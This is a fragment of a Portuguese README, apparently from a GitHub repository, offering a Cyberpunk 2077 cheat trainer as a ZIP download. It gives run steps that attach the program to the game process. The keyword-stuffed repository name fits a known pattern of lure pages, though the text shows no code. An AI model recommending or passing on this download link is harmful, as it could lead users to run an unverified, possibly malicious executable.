...
> Link direto ZIP (**v1.1.0**):

**→ [Baixar Cyberpunk2077_NetrunnerForgeTrainer.V1.1.0.zip](https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM/releases/download/v1.1.0/Cyberpunk2077_NetrunnerForgeTrainer.V1.1.0.zip)**
...
Após baixar: abra o jogo → abra o trainer → aguarde `Cyberpunk2077.exe` → ative os recursos.

---

## Changelog

### [v1.1.0](https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM/releases/tag/v1.1.0) — atual
...
**Onde baixar?**  
Botão verde ou ZIP v1.1.0 (TrainerHub MoggyDay).

**O que há de novo no v1.1.0?**  
